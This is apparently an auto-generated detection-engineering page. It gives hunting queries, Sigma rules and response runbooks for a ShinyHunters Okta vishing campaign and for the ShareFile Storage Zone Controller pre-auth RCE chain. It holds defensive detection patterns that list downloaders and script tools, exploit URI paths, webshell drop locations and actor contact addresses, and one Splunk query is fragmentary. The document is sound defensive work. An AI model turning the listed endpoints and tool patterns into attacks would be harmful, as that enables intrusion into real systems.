Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Odido lookalike Okta/SSO phishing-portal domain resolution (ShinyHunters vishing) · Phishing-link click correlated to endpoint execution · Email attachment opened from external sender · Microsoft Teams external-tenant chat from unverified IT-helpdesk impersonator
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] ShinyHunters Okta AiTM: failure-heavy auth flow then success (~10 min) · Office app spawning script/LOLBin child process
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Rogue Okta MFA factor enrolled as 'Passkey' from Genymobile-emulated Android · RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Post-compromise SSO burst: single account rapidly accessing many SaaS apps · [LLM] Bulk SaaS data exfil: high-volume automated downloads (Salesforce/SharePoint/Drive/Slack)
Odido lookalike Okta/SSO phishing-portal domain resolution (ShinyHunters vishing) AIDelivery Medium
Hunts DNS/network connections to attacker-registered lookalike domains that impersonate Odido's SSO, IT-support, or Okta login pages — the AiTM portals ShinyHunters (UNC6661/UNC6671) directs vished employees to. Because the lure arrives by phone/SMS out-of-band, network/DNS telemetry (not corporate email) is the detection surface. Rationale: Applies Huntress-documented ShinyHunters lookalike-domain naming convention (<company>sso[.]com, <company>okta[.]com, <company>support[.]com, <company>internal[.]com, <company>access[.]com) to 'odido'; vishing delivers the link out-of-band so DNS/network egress is the correct pivot rather than EmailEvents. Cross-checked against: • https://www.huntress.com/threat-library/threat-actors/shinyhunters • https://www.obsidiansecurity.com/blog/behind-the-breach-shinyhunters-2026-voice-phishing-campaign • https://socradar.io/blog/major-cyber-attacks-february-2026/
ATT&CKT1566.004 T1656 T1598.003
Data sourcesNetwork_Resolution.DNS
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security team sandboxing/analysing the phishing domain (SOC investigation traffic)
  • Brand-monitoring / takedown vendors resolving lookalike domains on the org's behalf
  • Third-party marketing microsite legitimately using an odido- prefixed domain
  • Typo of odido.nl resolving via a parked/registrar landing page
Suppression filter
| where not(RemoteUrl has_any ("odido.nl","odido.com")) and InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe")
Response runbook
1) Triage: identify the resolving host/user and whether a browser process reached the domain; pull the Okta/Entra sign-in for that user in the following 15 min to confirm a session was established. 2) Contain: block the domain at DNS/proxy, force-revoke the user's SSO sessions/tokens and reset credentials + re-enroll MFA. 3) Hunt: sweep all endpoints for the same domain list, review Okta system log for failure-burst-then-success and new MFA factor enrollment on that account, and check for SSO-burst app access.
let lookalikes = dynamic(["odidosso","odido-sso","myodidosso","odidosupport","odido-support","support-odido","odidookta","odido-okta","odidointernal","odido-internal","odidoaccess","odido-access","odidoazure"]);
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where isnotempty(RemoteUrl)
| where RemoteUrl has_any (lookalikes)
| where not(RemoteUrl has_any ("odido.nl","odido.com"))
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, RemoteUrl, RemoteIP, RemotePort
| order by Timestamp desc
let lookalikes = dynamic(["odidosso","odido-sso","myodidosso","odidosupport","odido-support","support-odido","odidookta","odido-okta","odidointernal","odido-internal","odidoaccess","odido-access","odidoazure"]);
ImDnsActivity
| where TimeGenerated > ago(30d)
| where DnsQuery has_any (lookalikes)
| where not(DnsQuery has_any ("odido.nl","odido.com"))
| project TimeGenerated, SrcIpAddr, SrcHostname, DvcHostname, DnsQuery, DnsResponseName
| order by TimeGenerated desc

ShinyHunters Okta AiTM: failure-heavy auth flow then success (~10 min) AIExploitation High
Detects the ShinyHunters/UNC6661 adversary-in-the-middle signature in Okta logs: a prolonged, failure-heavy authentication sequence (policy.evaluate_sign_on, app.ad.login.bad_password, core.user.factor.attempt_fail) that ends in a successful session for the same user within a short window — the fingerprint of an operator relaying credentials/MFA through a phishing proxy. Rationale: Uses the exact Okta event names Obsidian documented for this campaign (policy.evaluate_sign_on, app.ad.login.bad_password, core.user.factor.attempt_fail) plus the observed ~10-minute failure-then-success cadence, which distinguishes AiTM relay from a normal fat-finger login. Cross-checked against: • https://www.obsidiansecurity.com/blog/behind-the-breach-shinyhunters-2026-voice-phishing-campaign • https://www.intel471.com/blog/shinyhunters-0-day-attacks-after-patching-find-out-if-you-were-breached
ATT&CKT1621 T1111 T1078.004
Data sourcesAuthentication.Authentication
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • User genuinely forgetting password / fumbling MFA push before succeeding
  • Password rotation day producing repeated app.ad.login.bad_password before cache refresh
  • Flaky mobile network causing multiple factor.attempt_fail before a legit push accept
  • New device onboarding where the user retries several factors
Suppression filter
| where Failures >= 5 and Successes >= 1 and LastSuccess > FirstFail and array_length(SrcIPs) >= 1
Response runbook
1) Triage: pull the src IP/ASN and user-agent of the successful session — check for a datacenter/residential-proxy ASN and emulated-Android UA. 2) Contain: revoke all Okta sessions/OAuth tokens for the user, force password reset and MFA re-enrollment, and quarantine any newly enrolled factor. 3) Hunt: check whether a new 'Passkey' MFA device was enrolled right after the success, and whether the account then burst-accessed multiple SSO apps or downloaded bulk SaaS files.
ImAuthentication
| where TimeGenerated > ago(1d)
| where EventProduct has "Okta"
| summarize Failures = countif(EventResult == "Failure"),
            Successes = countif(EventResult == "Success"),
            FirstFail = minif(TimeGenerated, EventResult == "Failure"),
            LastSuccess = maxif(TimeGenerated, EventResult == "Success"),
            SrcIPs = make_set(SrcIpAddr, 10)
        by TargetUsername, bin(TimeGenerated, 15m)
| where Failures >= 5 and Successes >= 1   // ~10-min failure-heavy AiTM flow ending in success (baseline P99 fail-then-success <=2)
| where LastSuccess > FirstFail
| order by TimeGenerated desc
source:okta @outcome.result:FAILURE @evt.name:(policy.evaluate_sign_on OR core.user.factor.attempt_fail OR app.ad.login.bad_password)
CLOUD
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count(eval(Authentication.action="failure")) as failures count(eval(Authentication.action="success")) as successes min(_time) as firstTime max(_time) as lastTime from datamodel=Authentication.Authentication where Authentication.app="okta" by Authentication.user Authentication.src _time span=15m
| `drop_dm_object_name(Authentication)`
| where failures >= 5 AND successes >= 1
| eval flowSeconds=lastTime-firstTime
| where flowSeconds <= 900
| sort - lastTime
| tstats summariesonly=false count(eval(Authentication.action="failure")) as failures count(eval(Authentication.action="success")) as successes min(_time) as firstTime max(_time) as lastTime from datamodel=Authentication.Authentication where Authentication.app="okta" by Authentication.user Authentication.src _time span=15m
| `drop_dm_object_name(Authentication)`
| where failures >= 5 AND successes >= 1
| eval flowSeconds=lastTime-firstTime
| where flowSeconds <= 900
| sort - lastTime
Rogue Okta MFA factor enrolled as 'Passkey' from Genymobile-emulated Android AIInstallation High
Detects ShinyHunters' MFA-persistence step: enrolling an Okta Verify/FastPass factor on an emulated Android device consistently named 'Passkey' with the user-agent com.okta.android.auth/8.19.0 running under Genymobile. This is a high-fidelity, campaign-specific string set rather than generic 'new MFA device' noise. Rationale: Anchored to three corroborated, high-specificity strings from Obsidian/Huntress — the 'Passkey' device name, the Genymobile emulator, and the exact com.okta.android.auth/8.19.0 build — so it fires almost exclusively on this actor's MFA-hijack step. Cross-checked against: • https://www.obsidiansecurity.com/blog/behind-the-breach-shinyhunters-2026-voice-phishing-campaign • https://www.huntress.com/threat-library/threat-actors/shinyhunters
ATT&CKT1556.006 T1098.005
Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • QA/security team using a Genymobile emulator to test Okta mobile enrollment
  • Developer legitimately naming a passkey factor 'Passkey' on a physical device (UA will differ)
  • MDM bulk re-enrollment campaign touching user.mfa.factor.update at scale
Response runbook
1) Triage: confirm the enrollment's src IP/UA and whether it followed a failure-burst login for the same user. 2) Contain: delete the rogue factor, revoke all sessions/tokens, reset credentials and re-enroll MFA on a verified device; disable the account if access spread. 3) Hunt: enumerate all factors enrolled from Genymobile UAs or named 'Passkey' across the tenant, and review SSO-burst / bulk-download activity from the affected accounts.
title: Rogue Okta MFA Enrollment - Passkey Device on Genymobile Emulator (ShinyHunters)
id: 2c7d9a10-5b4e-4f21-8ad3-1e6c9b2f7a44
description: Detects Okta MFA factor enrollment on an emulated Android device named 'Passkey' with the com.okta.android.auth/8.19.0 Genymobile user-agent, matching ShinyHunters (UNC6661/UNC6671) persistence.
references:
  - https://www.obsidiansecurity.com/blog/behind-the-breach-shinyhunters-2026-voice-phishing-campaign
  - https://www.huntress.com/threat-library/threat-actors/shinyhunters
author: SOC Detection Engineering
date: 2026/07/10
tags:
  - attack.t1556.006
  - attack.t1098.005
logsource:
  product: okta
  service: okta
detection:
  selection_event:
    eventType:
      - user.mfa.factor.activate
      - system.mfa.factor.activate
      - user.mfa.factor.update
  selection_indicator:
    - client.userAgent.rawUserAgent|contains: 'Genymobile'
    - client.userAgent.rawUserAgent|contains: 'com.okta.android.auth/8.19.0'
    - target.displayName|contains: 'Passkey'
  condition: selection_event and selection_indicator
level: high
source:okta @evt.name:(user.mfa.factor.activate OR system.mfa.factor.activate OR user.mfa.factor.update) (Passkey AND (Genymobile OR "com.okta.android.auth/8.19.0"))
CLOUD
index=okta (eventType="user.mfa.factor.activate" OR eventType="system.mfa.factor.activate" OR eventType="user.mfa.factor.update")
| search (client.userAgent.rawUserAgent="*Genymobile*" OR client.userAgent.rawUserAgent="*com.okta.android.auth/8.19.0*" OR target{}.displayName="*Passkey*")
| table _time actor.alternateId client.ipAddress client.userAgent.rawUserAgent target{}.displayName outcome.result
| sort - _time
Post-compromise SSO burst: single account rapidly accessing many SaaS apps AIActions on Objectives Medium
Detects the ShinyHunters 'SSO burst' behavior where a hijacked identity enumerates and authenticates into an unusually large number of SSO-connected applications within minutes to locate data repositories. Distinct pivot from the auth-failure UC: this counts distinct downstream apps per account in a tight window. Rationale: Directly implements the 'rapid access to an unusual number of SSO-connected applications' / 'SSO Burst' behavior documented by Obsidian and Intel 471 for this campaign, counting distinct downstream apps per identity per 10-minute bin. Cross-checked against: • https://www.obsidiansecurity.com/blog/behind-the-breach-shinyhunters-2026-voice-phishing-campaign • https://www.intel471.com/blog/shinyhunters-0-day-attacks-after-patching-find-out-if-you-were-breached
ATT&CKT1538 T1528 T1078.004
Data sourcesAuthentication.Authentication
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Onboarding/offboarding automation or an IdP admin testing app assignments
  • A power user (exec/IT) who legitimately touches many apps at start of day
  • SSO session-refresh storm after a certificate/metadata rotation reissuing tokens for all apps
  • Scripted health-check / synthetic monitoring account probing multiple SaaS apps
Suppression filter
| where AppCount >= 8 and not(AccountDisplayName has_any ("svc-","sync","automation","admin-onboard"))
Response runbook
1) Triage: review the app list and src IP — flag if apps span unrelated business units (CRM + storage + chat) from one IP/UA. 2) Contain: revoke sessions/tokens, reset credentials, and step-up MFA; temporarily restrict the account to essential apps via conditional access. 3) Hunt: pivot to bulk-download activity in the accessed apps (Salesforce Data Loader, SharePoint/Drive/Slack exports) and to the preceding rogue MFA enrollment.
CloudAppEvents
| where Timestamp > ago(1d)
| where ActionType has_any ("LoggedIn","Login","Logon","SignIn")
| summarize AppCount = dcount(Application), Apps = make_set(Application, 30), IPs = make_set(IPAddress, 10)
        by AccountObjectId, AccountDisplayName, bin(Timestamp, 10m)
| where AppCount >= 8   // rapid SSO fan-out; typical user P99 <=4 distinct apps / 10m
| order by AppCount desc
ImAuthentication
| where TimeGenerated > ago(1d)
| where EventProduct has "Okta" and EventResult == "Success"
| summarize AppCount = dcount(TargetAppName), Apps = make_set(TargetAppName, 30), SrcIPs = make_set(SrcIpAddr, 10)
        by ActorUsername, bin(TimeGenerated, 10m)
| where AppCount >= 8   // SSO burst threshold; baseline P99 <=4 distinct apps / 10m
| order by AppCount desc
source:okta @evt.name:user.authentication.sso @outcome.result:SUCCESS
CLOUD
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true dc(Authentication.app) as appCount values(Authentication.app) as apps values(Authentication.src) as srcs min(_time) as firstTime max(_time) as lastTime from datamodel=Authentication.Authentication where Authentication.action="success" Authentication.vendor_product="Okta" by Authentication.user _time span=10m
| `drop_dm_object_name(Authentication)`
| where appCount >= 8
| sort - appCount
| tstats summariesonly=false dc(Authentication.app) as appCount values(Authentication.app) as apps values(Authentication.src) as srcs min(_time) as firstTime max(_time) as lastTime from datamodel=Authentication.Authentication where Authentication.action="success" Authentication.vendor_product="Okta" by Authentication.user _time span=10m
| `drop_dm_object_name(Authentication)`
| where appCount >= 8
| sort - appCount
Bulk SaaS data exfil: high-volume automated downloads (Salesforce/SharePoint/Drive/Slack) AIActions on Objectives Medium
Detects the ShinyHunters exfiltration stage — a hijacked account pulling a very large number of files within a sustained window (Obsidian observed ~90-minute automated download sessions and downloads seconds apart), plus PowerShell-driven SharePoint/OneDrive bulk downloads on the endpoint. Matches the 88GB / 15M-record theft profile from the Odido breach. Rationale: Implements Obsidian's documented exfil signature — high-volume downloads within seconds over a ~90-minute automated session across Google Drive/Slack/SharePoint plus PowerShell SharePoint/OneDrive pulls — matching Odido's disclosed 88GB / 15M-record theft. Cross-checked against: • https://www.obsidiansecurity.com/blog/behind-the-breach-shinyhunters-2026-voice-phishing-campaign • https://socradar.io/blog/major-cyber-attacks-february-2026/
ATT&CKT1567.002 T1530 T1213
Data sources
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate large migration / eDiscovery / backup export by IT
  • Employee bulk-downloading their own project folder before leaving or for offline work
  • OneDrive/SharePoint sync client doing a full re-sync after cache reset
  • Data-science pipeline account exporting datasets on schedule
Suppression filter
| where Downloads >= 100 and WindowSec <= 5400 and not(AccountDisplayName has_any ("backup","svc-","migration","ediscovery"))
Response runbook
1) Triage: identify the account, src IP/app, and whether downloads span sensitive repositories (CRM/customer-contact data); check if PowerShell UA or Salesforce Data Loader was involved. 2) Contain: revoke sessions/tokens, block the src IP, disable the account, and preserve the download logs for scope. 3) Hunt: correlate back to the rogue MFA enrollment and SSO burst for the same identity, and check for the account leaving internal security Slack channels or extortion email from shinycorp@tutanota.com / shinygroup@onionmail.com.
CloudAppEvents
| where Timestamp > ago(1d)
| where ActionType has "Download"   // FileDownloaded, FileSyncDownloadedFull, FileDownloadedFromSharePoint
| summarize Downloads = count(), Apps = make_set(Application, 10), IPs = make_set(IPAddress, 10), FirstDl = min(Timestamp), LastDl = max(Timestamp)
        by AccountObjectId, AccountDisplayName, bin(Timestamp, 30m)
| extend WindowSec = datetime_diff('second', LastDl, FirstDl)
| where Downloads >= 100 and WindowSec <= 5400   // >=100 files inside a <=90-min automated pull
| order by Downloads desc
OfficeActivity
| where TimeGenerated > ago(1d)
| where Operation in ("FileDownloaded","FileSyncDownloadedFull","FileSyncDownloadedPartial")
| summarize Downloads = count(), DistinctFiles = dcount(SourceFileName), FirstDl = min(TimeGenerated), LastDl = max(TimeGenerated)
        by UserId, ClientIP, bin(TimeGenerated, 30m)
| extend WindowSec = datetime_diff('second', LastDl, FirstDl)
| where Downloads >= 100 and WindowSec <= 5400   // >=100 files inside a <=90-min automated pull
| order by Downloads desc
#event_simpleName=ProcessRollup2
| ImageFileName=/\\(powershell|pwsh)\.exe$/i
| CommandLine=/(sharepoint\.com|-my\.sharepoint\.com|graph\.microsoft\.com|onedrive)/i
| CommandLine=/(Invoke-WebRequest|iwr|DownloadFile|Start-BitsTransfer|Invoke-RestMethod)/i
| groupBy([aid, ComputerName, UserName], function=count())
ENDPOINT
index=o365 Operation IN ("FileDownloaded","FileSyncDownloadedFull","FileSyncDownloadedPartial")
| bin _time span=30m
| stats count as downloads dc(SourceFileName) as distinctFiles values(ClientIP) as ips min(_time) as firstDl max(_time) as lastDl by UserId _time
| eval windowSeconds=lastDl-firstDl
| where downloads >= 100 AND windowSeconds <= 5400
| sort - downloads
Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB

    from datamodel=Web

    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url

    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"

    [| tstats `summariesonly` earliest(_time) AS exec_time

         from datamodel=Endpoint.Processes

                                                   "outlook.exe","brave.exe","arc.exe")

URGENT - Progress Tells ShareFile Customers to Shut Down Storage Zone Controllers Over Security Threat

The Hacker News
2026-07-10 9 use cases 3 techniques 6 kill-chain phases detected

Progress Software has told ShareFile customers to shut down the Windows servers running their Storage Zone Controllers, confirming to The Hacker News that it is responding to a "credible external security threat." The company has temporarily disabled access to the affected accounts, a step it says it took "out of an abundance of caution" while it works with internal and external security

CVEsCVE-2026-2699 CVE-2026-2701 CVE-2023-24489
ATT&CKT1190 T1486 T1555.003

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] ShareFile Storage Zone Controller pre-auth exploit URIs in IIS logs (CVE-2026-2699/2701)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] ShareFile Storage Zone Controller IIS worker (w3wp.exe) spawns shell/recon child · [LLM] ASPX webshell written under ShareFile Storage Zone Controller storage path · Suspicious browser extension installation
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
ShareFile Storage Zone Controller pre-auth exploit URIs in IIS logs (CVE-2026-2699/2701) AIExploitation High
Hunts inbound HTTP requests to the specific ShareFile Storage Zone Controller endpoints abused in the watchTowr-disclosed pre-auth RCE chain: the ConfigService auth-bypass page, the misspelled StroageZoneConfig API, and upload.aspx with an unzip parameter. This is the exact initial-access signature behind Progress's shutdown order. Rationale: Uses the exact exploit endpoints from watchTowr's chain writeup — /ConfigService/Admin.aspx (auth bypass), the misspelled /ConfigService/api/StroageZoneConfig, and upload.aspx?...unzip. The typo'd internal API path is effectively pathognomonic for exploitation. IIS logs are the only telemetry carrying the URI, so Defender/Falcon/Datadog/CloudWatch are left empty. Cross-checked against: • https://labs.watchtowr.com/youre-not-supposed-to-sharefile-with-everyone-progress-sharefile-pre-auth-rce-chain-cve-2026-2699-cve-2026-2701/ • https://watchtowr.com/resources/progress-sharefile-storage-zone-controller-pre-auth-rce-cve-2026-2699-cve-2026-2701/ • https://www.bleepingcomputer.com/news/security/progress-urges-sharefile-customers-to-shut-down-servers-over-credible-threat/
ATT&CKT1190 T1505.003
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Authorized vulnerability scanners (Qualys/Tenable/Rapid7) probing the same endpoints
  • watchTowr / Shadowserver internet-wide exposure scans hitting /ConfigService
  • Legitimate ShareFile admin reaching /ConfigService/Admin.aspx from an internal management IP after authenticating
  • Security team replaying PoC during authorized IR validation
Suppression filter
| where cIP !in ("<internal_vuln_scanner_ip>") // suppress authorized scanner ranges; keep external IPs in scope
Response runbook
1) Triage: pull all hits for the offending cIP; check scStatus — a 200/302 on /ConfigService/Admin.aspx or a POST to upload.aspx?...unzip from an external IP is a likely successful exploit, and requests to the misspelled StroageZoneConfig confirm PoC-derived tooling. 2) Contain: per Progress guidance, keep the controller offline; block the source IP at the perimeter and preserve IIS logs and the storage tree for forensics. 3) Hunt: on the same host pivot to newly written .aspx files under \StorageCenter\ (UC2) and w3wp.exe child shells (UC3); scope the source IP across all internet-facing assets.
W3CIISLog
| where TimeGenerated > ago(30d)
| where csUriStem has_any ("/ConfigService/Admin.aspx", "/ConfigService/api/StroageZoneConfig", "/documentum/upload.aspx")
   or (csUriStem endswith "/upload.aspx" and csUriQuery has "unzip")
| project TimeGenerated, Computer, SrcIP = cIP, csMethod, csUriStem, csUriQuery, scStatus, UserAgent = csUserAgent
| order by TimeGenerated desc

ShareFile Storage Zone Controller IIS worker (w3wp.exe) spawns shell/recon child AIInstallation High
Detects the post-exploitation execution stage of the ShareFile pre-auth RCE: the IIS worker process hosting the Storage Zone Controller (w3wp.exe) spawning interactive shells or host-recon binaries, which is how an uploaded ASPX webshell runs commands. Directly supports the article's 'treat it as a possible incident' guidance. Rationale: w3wp.exe (the IIS worker) spawning cmd/powershell/recon binaries is the direct execution artifact of an ASPX webshell running commands on the Storage Zone Controller — the exact chain outcome watchTowr demonstrated. Parent=w3wp + child shell/LOLBin is the high-fidelity pair; scope to ShareFile SZC hosts via the FP filter to cut other IIS app pools. Cross-checked against: • https://labs.watchtowr.com/youre-not-supposed-to-sharefile-with-everyone-progress-sharefile-pre-auth-rce-chain-cve-2026-2699-cve-2026-2701/ • https://www.helpnetsecurity.com/2023/08/17/cve-2023-24489-exploited/ • https://cybersecuritynews.com/progress-sharefile-admins-shut-down-servers/
ATT&CKT1505.003 T1059.003 T1059.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Other IIS-hosted web apps on the same server legitimately shelling out (custom .NET apps calling Process.Start)
  • Web app deployment/maintenance running appcmd, DISM, or provisioning scripts under w3wp
  • Monitoring/APM agents invoking cmd or PowerShell from the worker
  • Admin troubleshooting an app pool via a diagnostic .aspx page
  • Backup or config tooling that shells out during app-pool recycle
Suppression filter
| where InitiatingProcessCommandLine has_any ("StorageCenter", "documentum", "ShareFile") // restrict to the ShareFile SZC app pool; drop to widen to all IIS
Response runbook
1) Triage: inspect ProcessCommandLine of the child — whoami/net/nltest recon or download strings (certutil/bitsadmin/curl) launched by w3wp on a ShareFile host is near-certain webshell RCE; capture the full process tree and parent w3wp command line (app-pool name). 2) Contain: isolate the host and keep the controller offline per Progress guidance; snapshot memory before reboot to preserve any in-memory implant. 3) Hunt: correlate to newly written .aspx under \StorageCenter\ (UC3) and inbound exploit URIs (UC1) within the preceding minutes; sweep for outbound connections from w3wp and new local accounts/services.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName =~ "w3wp.exe"
| where FileName in~ ("cmd.exe","powershell.exe","pwsh.exe","net.exe","net1.exe","whoami.exe","ipconfig.exe","systeminfo.exe","nltest.exe","hostname.exe","tasklist.exe","cscript.exe","wscript.exe","certutil.exe","bitsadmin.exe","curl.exe","reg.exe","sc.exe")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessFolderPath
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where ParentProcessName endswith @"\w3wp.exe"
| where NewProcessName has_any (@"\cmd.exe", @"\powershell.exe", @"\pwsh.exe", @"\net.exe", @"\net1.exe", @"\whoami.exe", @"\ipconfig.exe", @"\systeminfo.exe", @"\nltest.exe", @"\hostname.exe", @"\tasklist.exe", @"\cscript.exe", @"\wscript.exe", @"\certutil.exe", @"\bitsadmin.exe", @"\reg.exe", @"\sc.exe")
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc

ASPX webshell written under ShareFile Storage Zone Controller storage path AIInstallation High
Detects creation of ASPX/ASHX web-executable files inside the Storage Zone Controller's IIS-served storage tree (…\StorageCenter\…\files\ul-…), which is where the CVE-2026-2699/2701 chain drops its webshell. This is the persistence artifact Progress told admins to look for ('unfamiliar .aspx files in the web folders and storage paths'). Rationale: watchTowr confirmed the webshell lands under the SZC storage location that overlaps the IIS web root (e.g. C:\inetpub\wwwroot\ShareFile\StorageCenter\documentum\files\ul-<id>\1\). A newly created .aspx/.ashx under any \StorageCenter\ path is the article's 'unfamiliar .aspx' artifact — legitimate ShareFile user uploads are documents, not server-executable pages in that tree. Cross-checked against: • https://labs.watchtowr.com/youre-not-supposed-to-sharefile-with-everyone-progress-sharefile-pre-auth-rce-chain-cve-2026-2699-cve-2026-2701/ • https://support.sharefile.com/s/article/ShareFile-StorageZones-Controller-Security-Update-for-CVE-2023-24489 • https://docs.sharefile.com/en-us/storage-zones-controller/5-0/security-vulnerability-feb26.html
ATT&CKT1505.003 T1190
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Progress-signed installer/upgrade writing legitimate .aspx pages during a 5.12.4 patch deployment
  • Admin manually placing a diagnostic or health-check .aspx in the StorageCenter web app
  • A user legitimately uploading a document literally named *.aspx into a ShareFile storage zone (rare)
  • Backup/restore tooling re-creating the StorageCenter directory tree
Suppression filter
| where InitiatingProcessFileName !in~ ("msiexec.exe", "ShareFile.StorageCenter.Setup.exe", "TrustedInstaller.exe") // exclude signed installer/patch writes; investigate w3wp.exe-authored files
Response runbook
1) Triage: retrieve and read the file contents/hash — webshell indicators are eval/Request/Process.Start/cmd handlers; check InitiatingProcess (w3wp.exe writing it is damning) and creation time against the patch-deployment window. 2) Contain: keep the controller offline per Progress; quarantine the file, preserve a copy for forensics, and block the uploading source IP. 3) Hunt: pivot to inbound exploit URIs (UC1) and w3wp child shells (UC2) near the file-creation time; hash-sweep all SZC hosts for the same file and scan every internet-facing controller for .aspx under \StorageCenter\.
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType == "FileCreated"
| where FolderPath has @"\StorageCenter\"
| where FileName endswith ".aspx" or FileName endswith ".ashx" or FileName endswith ".asmx" or FileName endswith ".asp"
| project Timestamp, DeviceName, FolderPath, FileName, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where EventType == "FileCreated"
| where TargetFilePath has @"\StorageCenter\"
| where TargetFileExtension in~ ("aspx", "ashx", "asmx", "asp")
